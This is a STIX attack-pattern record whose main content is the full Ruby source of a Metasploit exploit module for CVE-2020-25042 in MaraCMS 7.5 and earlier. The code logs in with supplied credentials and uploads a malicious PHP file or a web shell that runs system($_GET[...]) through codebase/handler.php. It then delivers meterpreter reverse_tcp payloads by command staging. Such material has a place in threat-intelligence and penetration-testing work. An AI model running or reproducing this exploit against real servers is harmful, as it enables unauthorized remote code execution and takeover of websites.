{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--8d2fd91d-0362-4a9a-9f48-a2daf42e720e",
    "created": "2024-08-14T17:11:03.887176Z",
    "modified": "2024-08-14T17:11:03.88718Z",
    "name": "MaraCMS Arbitrary PHP File Upload",
    "description": " This module exploits an arbitrary file upload vulnerability in MaraCMS 7.5 and prior in order to execute arbitrary commands.  The module first attempts to authenticate to MaraCMS. It then tries to upload a malicious PHP file to the web root via an HTTP POST request to `codebase/handler.php.` If the `php` target is selected the payload is embedded in the uploaded file and the module attempts to execute the payload via an HTTP GET request to this file. For the `linux` and `windows` targets, the module uploads a simple PHP web shell similar to `<?php system($_GET[\"cmd\"]); ?>`. Subsequently, it leverages the CmdStager mixin to deliver the final payload via a series of HTTP GET requests to the PHP web shell.  Valid credentials for a MaraCMS `admin` or `manager` account are required. This module has been successfully tested against MaraCMS 7.5 running on Windows Server 2012 (XAMPP server).  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/maracms_upload_exec.rb",
            "external_id": "maracms_upload_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-25042"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n  include Msf::Exploit::FileDropper\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'MaraCMS Arbitrary PHP File Upload',\n        'Description' => %q{\n          This module exploits an arbitrary file upload vulnerability in\n          MaraCMS 7.5 and prior in order to execute arbitrary commands.\n\n          The module first attempts to authenticate to MaraCMS. It then tries\n          to upload a malicious PHP file to the web root via an HTTP POST\n          request to `codebase/handler.php.` If the `php` target is selected,\n          the payload is embedded in the uploaded file and the module attempts\n          to execute the payload via an HTTP GET request to this file. For the\n          `linux` and `windows` targets, the module uploads a simple PHP web\n          shell similar to `<?php system($_GET[\"cmd\"]); ?>`. Subsequently, it\n          leverages the CmdStager mixin to deliver the final payload via a\n          series of HTTP GET requests to the PHP web shell.\n\n          Valid credentials for a MaraCMS `admin` or `manager` account are\n          required. This module has been successfully tested against MaraCMS\n          7.5 running on Windows Server 2012 (XAMPP server).\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Michele Cisternino', # aka (0blio_) - discovery and PoC\n          'Erik Wynter' # @wyntererik - Metasploit\n        ],\n        'References' => [\n          ['CVE', '2020-25042'],\n          ['EDB', '48780']\n        ],\n        'Payload' => {\n          'BadChars' => \"\\x00\\x0d\\x0a\"\n        },\n        'Platform' => %w[linux win php],\n        'Arch' => [ ARCH_X86, ARCH_X64, ARCH_PHP],\n        'Targets' => [\n          [\n            'PHP', {\n              'Arch' => [ARCH_PHP],\n              'Platform' => 'php',\n              'DefaultOptions' => {\n                'PAYLOAD' => 'php/meterpreter/reverse_tcp'\n              }\n            }\n          ],\n          [\n            'Linux', {\n              'Arch' => [ARCH_X86, ARCH_X64],\n              'Platform' => 'linux',\n              'DefaultOptions' => {\n                'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp'\n              }\n            }\n          ],\n          [\n            'Windows', {\n              'Arch' => [ARCH_X86, ARCH_X64],\n              'Platform' => 'win',\n              'DefaultOptions' => {\n                'PAYLOAD' => 'windows/x64/meterpreter/reverse_tcp'\n              }\n            }\n          ]\n        ],\n        'Privileged' => false,\n        'DisclosureDate' => '2020-08-31',\n        'DefaultTarget' => 0\n      )\n    )\n\n    register_options [\n      OptString.new('TARGETURI', [true, 'The base path to MaraCMS', '/']),\n      OptString.new('USERNAME', [true, 'Username to authenticate with', 'admin']),\n      OptString.new('PASSWORD', [true, 'Password to authenticate with', 'changeme'])\n    ]\n  end\n\n  def check\n    vprint_status('Running check')\n\n    # visit /about.php to obtain MaraCMS version and cookies\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, 'about.php'),\n      'keep_cookies' => true\n    })\n\n    unless res\n      return CheckCode::Unknown('Connection failed.')\n    end\n\n    unless res.code == 200 && res.body.include?('Mara cms')\n      return CheckCode::Safe('Target is not a MaraCMS application.')\n    end\n\n    html = res.get_html_document\n    version_header = html.css('h1').text # obtain the h1 text, which for MaraCMS 7.5 is `Version 7.2 :: Production release`\n    version = version_header.split(' ')[1] # grab the version number\n\n    if version.blank?\n      return CheckCode::Detected('Could not determine MaraCMS version.')\n    end\n\n    version = Rex::Version.new version\n\n    unless version <= Rex::Version.new('7.2') # 7.2 is the version listed on the about page for MaraCMS 7.5\n      # MaraCMS no longer seems to be maintained, but the check below is added in case they every update it\n      return CheckCode::Safe('Target is likely MaraCMS with a version higher than 7.5 and may not be vulnerable.')\n    end\n\n    return CheckCode::Appears('Target is most likely MaraCMS with version 7.5 or lower')\n  end\n\n  def login\n    # visit login page in order to obtain `shash` value, which is necessary for authentication\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path),\n      'vars_get' => { 'login' => '' }\n    })\n\n    unless res\n      fail_with(Failure::Disconnected, 'Connection failed while trying to authenticate.')\n    end\n\n    unless res.code == 200 && /shash='(?<shash>.*?)';/ =~ res.body # obtain shash value from inside a <script> tag\n      fail_with(Failure::Unknown, 'Failed to obtain the `shash` token that is necessary to authenticate to the server.')\n    end\n\n    nocache_value = rand # when visiting the page with a browser, JS generates the nocache_value in the same manner\n\n    # try to obtain salt required for authentication\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'codebase', 'handler.php'),\n      'ctype' => 'application/x-www-form-urlencoded',\n      'headers' => { 'Referer' => \"#{ssl ? 'https' : 'http'}://#{peer}\" },\n      'vars_get' => {\n        'nocache' => nocache_value\n      },\n      'vars_post' => {\n        'action' => Rex::Text.encode_base64('setsalt').to_s,\n        'enccrc' => Digest::SHA256.hexdigest(''), # sha256 encoding of empty string\n        'status' => Rex::Text.encode_base64('Sending Request').to_s\n      }\n    })\n\n    unless res\n      fail_with(Failure::Disconnected, 'Connection failed while trying to authenticate.')\n    end\n\n    unless res.code == 200 && res.body.include?('~::~')\n      fail_with(Failure::UnexpectedReply, 'Unexpected response received while trying to obtain the salt required for authentication.')\n    end\n\n    # obtain salt\n    salt_base64 = res.body.to_s.split('~')[2] # the base64 encoded salt is returned in the format: ~::~encoded_salt~::~\n    salt = Rex::Text.decode_base64(salt_base64)\n    if salt.to_i == 0 # if the salt is nil or contains characters other than numbers, this will be true\n      # in case of an error, the server sends the error message, so this should be passed to the user\n      fail_with(Failure::Unknown, \"Failed to obtain the salt required for authentication. The server sent the following response: #{salt}\")\n    end\n    print_status(\"Obtained salt `#{salt}` from server. Using salt to authenticate...\")\n\n    # use salt to generate authentication tokens\n    username = datastore['USERNAME']\n    password = datastore['PASSWORD']\n    @username_base64 = Rex::Text.encode_base64(username) # this value is also used when uploading the payload\n    unsalted_hash = Digest::SHA256.hexdigest(\"#{password}#{shash}#{username}\")\n    salted_hash = Digest::SHA256.hexdigest(\"#{unsalted_hash}#{salt}\")\n    @salted_hash_base64 = Rex::Text.encode_base64(salted_hash) # this value is also used when uploading the payload\n    nocache_value = rand # create new nocache_value\n\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'codebase', 'handler.php'),\n      'ctype' => 'application/x-www-form-urlencoded',\n      'headers' => { 'Referer' => \"#{ssl ? 'https' : 'http'}://#{peer}\" },\n      'vars_get' => {\n        'nocache' => nocache_value\n      },\n      'vars_post' => {\n        'usr' => @username_base64,\n        'hash' => Rex::Text.encode_base64(unsalted_hash),\n        'pwd' => @salted_hash_base64,\n        'action' => Rex::Text.encode_base64('login').to_s,\n        'enccrc' => Digest::SHA256.hexdigest(''), # sha256 encoding of empty string\n        'rawresponse' => Rex::Text.encode_base64(salt_base64),\n        'status' => Rex::Text.encode_base64('Sending Request').to_s\n      }\n    })\n\n    unless res\n      fail_with(Failure::Disconnected, 'Connection failed while trying to authenticate.')\n    end\n\n    unless res.code == 200 && res.body.include?('~::~')\n      fail_with(Failure::UnexpectedReply, 'Unexpected response received while trying to authenticate to the server.')\n    end\n\n    # obtain base64 encoded response from body and decode it\n    server_response = Rex::Text.decode_base64(res.body.to_s.split('~')[2])\n    unless server_response.include?('OK:')\n      fail_with(Failure::NoAccess, \"#{server_response}.\") # if authentication fails, the server sends the error message\n    end\n\n    print_good('Successfully authenticated to MaraCMS')\n  end\n\n  def upload_payload\n    # set payload according to target platform\n    if target['Platform'] == 'php'\n      pl = payload.encoded\n    else\n      @shell_cmd_name = rand_text_alphanumeric(3..6)\n      pl = \"system($_GET[\\\"#{@shell_cmd_name}\\\"]);\"\n    end\n\n    @payload_name = rand_text_alphanumeric(8..12) << '.php'\n    one_base64 = Rex::Text.encode_base64('1') # used twice below\n\n    # generate post data\n    post_data = Rex::MIME::Message.new\n    post_data.add_part(one_base64.to_s, nil, nil, 'form-data; name=\"authenticated\"')\n    post_data.add_part(Rex::Text.encode_base64('upload').to_s, nil, nil, 'form-data; name=\"action\"')\n    post_data.add_part('10485760', nil, nil, 'form-data; name=\"MAX_FILE_SIZE\"')\n    post_data.add_part('filenew', nil, nil, 'form-data; name=\"type\"')\n    post_data.add_part(\"<?php #{pl} ?>\", 'application/x-php', nil, \"form-data; name=\\\"files[]\\\"; filename=\\\"#{@payload_name}\\\"\")\n    post_data.add_part(@username_base64.to_s, nil, nil, 'form-data; name=\"usr\"')\n    post_data.add_part(@salted_hash_base64.to_s, nil, nil, 'form-data; name=\"pwd\"')\n    post_data.add_part(one_base64.to_s, nil, nil, 'form-data; name=\"authenticated\"')\n    post_data.add_part('/', nil, nil, 'form-data; name=\"destdir\"')\n\n    print_status(\"Uploading payload as #{@payload_name}...\")\n\n    # upload payload\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'codebase', 'handler.php'),\n      'ctype' => \"multipart/form-data; boundary=#{post_data.bound}\",\n      'headers' => { 'Referer' => \"#{ssl ? 'https' : 'http'}://#{peer}#{normalize_uri(target_uri.path, 'codebase', 'dir.php?type=filenew')}\" },\n      'data' => post_data.to_s\n    })\n\n    unless res\n      fail_with(Failure::Disconnected, 'Connection failed while trying to upload the payload.')\n    end\n\n    unless res.code == 200 && res.body.include?(\"OK: #{@payload_name} uploaded.\")\n      fail_with(Failure::Unknown, 'Failed to upload the payload.')\n    end\n\n    register_file_for_cleanup(@payload_name)\n\n    print_good(\"Successfully uploaded #{@payload_name}\")\n  end\n\n  def execute_command(cmd, _opts = {})\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, @payload_name),\n      'vars_get' => { @shell_cmd_name => cmd }\n    })\n\n    unless res && res.code == 200\n      fail_with(Failure::Unknown, 'Failed to execute the payload.')\n    end\n  end\n\n  def exploit\n    login\n\n    upload_payload\n\n    # For `php` targets, the payload can be executed via a simlpe GET request. For other targets, a cmdstager is necessary.\n    if target['Platform'] == 'php'\n      print_status('Executing the payload...')\n      send_request_cgi({\n        'method' => 'GET',\n        'uri' => normalize_uri(target_uri.path, @payload_name)\n      }, 0) # don't wait for a response from the target, otherwise the module will hang for a few seconds after executing the payload\n    else\n      print_status(\"Executing the payload via a series of HTTP GET requests to `/#{@payload_name}?#{@shell_cmd_name}=<command>`\")\n      execute_cmdstager(background: true)\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2020-08-31",
    "x_mitre_platforms": [
        "win'"
    ]
}